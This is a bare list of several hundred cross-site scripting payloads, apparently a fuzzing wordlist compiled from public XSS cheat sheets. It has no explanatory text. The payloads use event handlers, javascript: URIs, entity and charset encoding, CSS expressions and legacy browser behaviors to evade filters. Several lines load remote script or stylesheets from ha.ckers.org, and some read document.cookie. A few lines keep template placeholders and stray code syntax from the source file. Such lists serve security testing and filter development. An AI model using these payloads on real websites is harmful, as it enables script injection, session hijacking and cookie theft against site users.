"/&gt;&lt;img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x22javascript:alert(1)\x22src=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x09javascript:alert(1)\x09src=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x27javascript:alert(1)\x27src=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x60javascript:alert(1)\x60src=xxx:x /&gt;
"/&gt;&lt;img/onerror=\x20javascript:alert(1)\x20src=xxx:x /&gt;
&lt;script\x2F&gt;javascript:alert(1)&lt;/script&gt;
&lt;script\x20&gt;javascript:alert(1)&lt;/script&gt;
&lt;script\x0D&gt;javascript:alert(1)&lt;/script&gt;
&lt;script\x0A&gt;javascript:alert(1)&lt;/script&gt;
&lt;script\x0C&gt;javascript:alert(1)&lt;/script&gt;
&lt;script\x00&gt;javascript:alert(1)&lt;/script&gt;
&lt;script\x09&gt;javascript:alert(1)&lt;/script&gt;
`"'&gt;&lt;img src=xxx:x onerror\x0B=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x onerror\x00=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x onerror\x0C=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x onerror\x0D=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x onerror\x20=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x onerror\x0A=javascript:alert(1)&gt;
`"'&gt;&lt;img src=xxx:x onerror\x09=javascript:alert(1)&gt;
&lt;script&gt;javascript:alert(1)&lt;\x00/script&gt;
&lt;img src=# onerror\x3D"javascript:alert(1)" &gt;
&lt;input onfocus=javascript:alert(1) autofocus&gt;
&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;
&lt;video poster=javascript:javascript:alert(1)//
&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X
&lt;video&gt;&lt;source onerror="javascript:javascript:alert(1)"&gt;
&lt;video onerror="javascript:javascript:alert(1)"&gt;&lt;source&gt;
&lt;form&gt;&lt;button formaction="javascript:javascript:alert(1)"&gt;X
&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;
&lt;math href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;
&lt;frameset onload=javascript:alert(1)&gt;
&lt;table background="javascript:javascript:alert(1)"&gt;
&lt;!--&lt;img src="--&gt;&lt;img src=x onerror=javascript:alert(1)//"&gt;
&lt;comment&gt;&lt;img src="&lt;/comment&gt;&lt;img src=x onerror=javascript:alert(1))//"&gt;
&lt;![&gt;&lt;img src="]&gt;&lt;img src=x onerror=javascript:alert(1)//"&gt;
&lt;style&gt;&lt;img src="&lt;/style&gt;&lt;img src=x onerror=javascript:alert(1)//"&gt;
&lt;li style=list-style:url() onerror=javascript:alert(1)&gt; &lt;div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)&gt;&lt;/div&gt;
&lt;head&gt;&lt;base href="javascript://"&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="/. /,javascript:alert(1)//#"&gt;XXX&lt;/a&gt;&lt;/body&gt;
&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;
&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;
&lt;object data="data:text/html;base64,%(base64)s"&gt;
&lt;embed src="data:text/html;base64,%(base64)s"&gt;
&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0
&lt;div id="div1"&gt;&lt;input value="``onmouseover=javascript:alert(1)"&gt;&lt;/div&gt; &lt;div id="div2"&gt;&lt;/div&gt;&lt;script&gt;document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;&lt;/script&gt;
&lt;x '="foo"&gt;&lt;x foo='&gt;&lt;img src=x onerror=javascript:alert(1)//'&gt;
&lt;embed src="javascript:alert(1)"&gt;
&lt;img src="javascript:alert(1)"&gt;
&lt;image src="javascript:alert(1)"&gt;
&lt;script src="javascript:alert(1)"&gt;
&lt;div style=width:1px;filter:glow onfilterchange=javascript:alert(1)&gt;x
&lt;? foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
&lt;! foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
&lt;/ foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
&lt;? foo="&gt;&lt;x foo='?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;'&gt;"&gt;
&lt;! foo="[[[Inception]]"&gt;&lt;x foo="]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
&lt;% foo&gt;&lt;x foo="%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
&lt;div id=d&gt;&lt;x xmlns="&gt;&lt;iframe onload=javascript:alert(1)"&gt;&lt;/div&gt; &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;
&lt;img \x00src=x onerror="alert(1)"&gt;
&lt;img \x47src=x onerror="javascript:alert(1)"&gt;
&lt;img \x11src=x onerror="javascript:alert(1)"&gt;
&lt;img \x12src=x onerror="javascript:alert(1)"&gt;
&lt;img\x47src=x onerror="javascript:alert(1)"&gt;
&lt;img\x10src=x onerror="javascript:alert(1)"&gt;
&lt;img\x13src=x onerror="javascript:alert(1)"&gt;
&lt;img\x32src=x onerror="javascript:alert(1)"&gt;
&lt;img\x47src=x onerror="javascript:alert(1)"&gt;
&lt;img\x11src=x onerror="javascript:alert(1)"&gt;
&lt;img \x47src=x onerror="javascript:alert(1)"&gt;
&lt;img \x34src=x onerror="javascript:alert(1)"&gt;
&lt;img \x39src=x onerror="javascript:alert(1)"&gt;
&lt;img \x00src=x onerror="javascript:alert(1)"&gt;
&lt;img src\x09=x onerror="javascript:alert(1)"&gt;
&lt;img src\x10=x onerror="javascript:alert(1)"&gt;
&lt;img src\x13=x onerror="javascript:alert(1)"&gt;
&lt;img src\x32=x onerror="javascript:alert(1)"&gt;
&lt;img src\x12=x onerror="javascript:alert(1)"&gt;
&lt;img src\x11=x onerror="javascript:alert(1)"&gt;
&lt;img src\x00=x onerror="javascript:alert(1)"&gt;
&lt;img src\x47=x onerror="javascript:alert(1)"&gt;
&lt;img src=x\x09onerror="javascript:alert(1)"&gt;
&lt;img src=x\x10onerror="javascript:alert(1)"&gt;
&lt;img src=x\x11onerror="javascript:alert(1)"&gt;
&lt;img src=x\x12onerror="javascript:alert(1)"&gt;
&lt;img src=x\x13onerror="javascript:alert(1)"&gt;
&lt;img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)"&gt;
&lt;img src=x onerror=\x09"javascript:alert(1)"&gt;
&lt;img src=x onerror=\x10"javascript:alert(1)"&gt;
&lt;img src=x onerror=\x11"javascript:alert(1)"&gt;
&lt;img src=x onerror=\x12"javascript:alert(1)"&gt;
&lt;img src=x onerror=\x32"javascript:alert(1)"&gt;
&lt;img src=x onerror=\x00"javascript:alert(1)"&gt;
&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;
&lt;img src="x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;"` `&gt;
&lt;img src onerror /" '"= alt=javascript:alert(1)//"&gt;
&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;
&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt="`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;"&gt;
&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;
&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;
&lt;script src="/\%(jscript)s"&gt;&lt;/script&gt;
&lt;script src="\\%(jscript)s"&gt;&lt;/script&gt;
&lt;object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"&gt;&lt;/object&gt; &lt;object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;
&lt;a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current"&gt;X
&lt;style&gt;p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};&lt;/style&gt;
&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
&lt;style&gt;@import "data:,*%7bx:expression(javascript:alert(1))%7D";&lt;/style&gt;
&lt;a style="pointer-events:none;position:absolute;"&gt;&lt;a style="position:absolute;" onclick="javascript:alert(1);"&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a href="javascript:javascript:alert(1)"&gt;XXX&lt;/a&gt;
&lt;style&gt;*[{}@import'%(css)s?]&lt;/style&gt;X
&lt;div style="font-family:'foo&amp;#10;;color:red;';"&gt;XXX
&lt;div style="font-family:foo}color=red;"&gt;XXX
&lt;// style=x:expression\28javascript:alert(1)\29&gt;
&lt;style&gt;*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}&lt;/style&gt;
&lt;div style=content:url(%(svg)s)&gt;&lt;/div&gt;
&lt;div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"&gt;X
&lt;div id=d&gt;&lt;div style="font-family:'sans\27\3B color\3Ared\3B'"&gt;X&lt;/div&gt;&lt;/div&gt; &lt;script&gt;with(document.getElementById("d"))innerHTML=innerHTML&lt;/script&gt;
&lt;div style="background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);"&gt;X
&lt;div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"&gt;X
&lt;div id="x"&gt;XXX&lt;/div&gt; &lt;style&gt;  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  &lt;/style&gt;
&lt;x style="background:url('x&amp;#1;;color:red;/*')"&gt;XXX&lt;/x&gt;
&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;
&lt;script&gt;({0:#0=eval/#0#/#0#(javascript:alert(1))})&lt;/script&gt;
&lt;script&gt;ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x&lt;/script&gt;
&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()&lt;/script&gt;
&lt;meta charset="x-imap4-modified-utf7"&gt;&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi
&lt;meta charset="x-imap4-modified-utf7"&gt;&amp;&lt;script&amp;S1&amp;TS&amp;1&gt;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;
&lt;meta charset="mac-farsi"&gt;¼script¾javascript:alert(1)¼/script¾
X&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;
1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&amp;#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=javascript:alert(1)&amp;gt;`&gt;
1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&amp;lt;img/src=&amp;quot;.&amp;quot;onerror=javascript:alert(1)&amp;gt;&gt;
&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss&gt;&lt;/vmlframe&gt;
1&lt;a href=#&gt;&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;&lt;/a&gt;
&lt;a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)"&gt;XXX&lt;/a&gt;
&lt;x style="behavior:url(%(sct)s)"&gt;
&lt;xml id="xss" src="%(htc)s"&gt;&lt;/xml&gt; &lt;label dataformatas="html" datasrc="#xss" datafld="payload"&gt;&lt;/label&gt;
&lt;event-source src="%(event)s" onload="javascript:alert(1)"&gt;
&lt;a href="javascript:javascript:alert(1)"&gt;&lt;event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"&gt;
&lt;script&gt;%(payload)s&lt;/script&gt;
&lt;script src=%(jscript)s&gt;&lt;/script&gt;
&lt;script language='javascript' src='%(jscript)s'&gt;&lt;/script&gt;
&lt;script&gt;javascript:alert(1)&lt;/script&gt;
&lt;IMG SRC="javascript:javascript:alert(1);"&gt;
&lt;IMG SRC=javascript:javascript:alert(1)&gt;
&lt;IMG SRC=`javascript:javascript:alert(1)`&gt;
&lt;SCRIPT SRC=%(jscript)s?&lt;B&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:javascript:alert(1);"&gt;&lt;/FRAMESET&gt;
&lt;BODY ONLOAD=javascript:alert(1)&gt;
&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;
&lt;IMG SRC="jav    ascript:javascript:alert(1);"&gt;
&lt;BODY onload!#$%%&amp;()*~+-_.,:;?@[/|\]^`=javascript:alert(1)&gt;
&lt;SCRIPT/SRC="%(jscript)s"&gt;&lt;/SCRIPT&gt;
&lt;&lt;SCRIPT&gt;%(payload)s//&lt;&lt;/SCRIPT&gt;
&lt;IMG SRC="javascript:javascript:alert(1)"
&lt;iframe src=%(scriptlet)s &lt;
&lt;INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);"&gt;
&lt;IMG DYNSRC="javascript:javascript:alert(1)"&gt;
&lt;IMG LOWSRC="javascript:javascript:alert(1)"&gt;
&lt;BGSOUND SRC="javascript:javascript:alert(1);"&gt;
&lt;BR SIZE="&amp;{javascript:alert(1)}"&gt;
&lt;LAYER SRC="%(scriptlet)s"&gt;&lt;/LAYER&gt;
&lt;LINK REL="stylesheet" HREF="javascript:javascript:alert(1);"&gt;
&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;
&lt;META HTTP-EQUIV="Link" Content="&lt;%(css)s&gt;; REL=stylesheet"&gt;
&lt;XSS STYLE="behavior: url(%(htc)s);"&gt;
&lt;STYLE&gt;li {list-style-image: url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);"&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);"&gt;
&lt;IFRAME SRC="javascript:javascript:alert(1);"&gt;&lt;/IFRAME&gt;
&lt;TABLE BACKGROUND="javascript:javascript:alert(1)"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:javascript:alert(1)"&gt;
&lt;DIV STYLE="background-image: url(javascript:javascript:alert(1))"&gt;
&lt;DIV STYLE="width:expression(javascript:alert(1));"&gt;
&lt;IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))"&gt;
&lt;XSS STYLE="xss:expression(javascript:alert(1))"&gt;
&lt;STYLE TYPE="text/javascript"&gt;javascript:alert(1);&lt;/STYLE&gt;
&lt;STYLE&gt;.XSS{background-image:url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:javascript:alert(1)")}&lt;/STYLE&gt;
&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;javascript:alert(1);&lt;/SCRIPT&gt;&lt;![endif]--&gt;
&lt;BASE HREF="javascript:javascript:alert(1);//"&gt;
&lt;OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;
&lt;HTML xmlns:xss&gt;&lt;?import namespace="xss" implementation="%(htc)s"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;""","XML namespace."),("""&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC="javas&lt;!-- --&gt;cript:javascript:alert(1)"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&amp;lt;SCRIPT DEFER&amp;gt;javascript:alert(1)&amp;lt;/SCRIPT&amp;gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;
&lt;SCRIPT SRC="%(jpg)s"&gt;&lt;/SCRIPT&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
&lt;form id="test" /&gt;&lt;button form="test" formaction="javascript:javascript:alert(1)"&gt;X
&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
&lt;P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)"&gt;
&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;
&lt;STYLE&gt;a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}&lt;/STYLE&gt;
&lt;meta charset= "x-imap4-modified-utf7"&amp;&amp;&gt;&amp;&amp;&lt;script&amp;&amp;&gt;javascript:alert(1)&amp;&amp;;&amp;&amp;&lt;&amp;&amp;/script&amp;&amp;&gt;
&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;
&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;
&lt;?xml version="1.0"?&gt;&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;
&lt;embed code=%(scriptlet)s&gt;&lt;/embed&gt;
&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;
&lt;embed src=%(jscript)s&gt;&lt;/embed&gt;
&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;
&lt;object onerror=javascript:javascript:alert(1)&gt;
&lt;embed type="image" src=%(scriptlet)s&gt;&lt;/embed&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&lt;![CDATA[cript:javascript:alert(1);"&gt;]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;
&lt;IMG SRC=&amp;{javascript:alert(1);};&gt;
&lt;a href="jav&amp;#65ascript:javascript:alert(1)"&gt;test1&lt;/a&gt;
&lt;a href="jav&amp;#97ascript:javascript:alert(1)"&gt;test1&lt;/a&gt;
&lt;embed width=500 height=500 code="data:text/html,&lt;script&gt;%(payload)s&lt;/script&gt;"&gt;&lt;/embed&gt;
&lt;iframe srcdoc="&amp;LT;iframe&amp;sol;srcdoc=&amp;amp;lt;img&amp;sol;src=&amp;amp;apos;&amp;amp;apos;onerror=javascript:alert(1)&amp;amp;gt;&gt;"&gt;
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
'';!--"&lt;XSS&gt;=&amp;{()}
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
&lt;IMG SRC="javascript:alert('XSS');"&gt;
&lt;IMG SRC=javascript:alert('XSS')&gt;
&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
&lt;IMG SRC=javascript:alert("XSS")&gt;
&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
&lt;a onmouseover="alert(document.cookie)"&gt;xxs link&lt;/a&gt;
&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
&lt;IMG onmouseover="alert('xxs')"&gt;
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out
&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
&lt;SCRIPT/SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;
&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
&lt;IMG SRC="javascript:alert('XSS')"
&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
\";alert('XSS');//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
&lt;IMG SRC="livescript:[code]"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
&lt;BR SIZE="&amp;{alert('XSS')}"&gt;
&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;
&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;
&lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;
exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
¼script¾alert(¢XSS¢)¼/script¾
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"&gt;
&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
&lt;BASE HREF="javascript:alert('XSS');//"&gt;
 &lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;
